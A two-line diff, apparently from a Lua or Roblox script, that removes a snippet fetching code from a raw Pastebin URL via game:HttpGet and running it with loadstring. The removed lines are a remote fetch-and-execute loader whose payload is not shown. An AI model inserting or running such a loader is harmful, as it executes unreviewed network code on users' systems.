@@ -1,2 +1,0 @@
-local scriptData = game:HttpGet("https://pastebin.com/raw/enEpd9EK")
-loadstring(scriptData)()
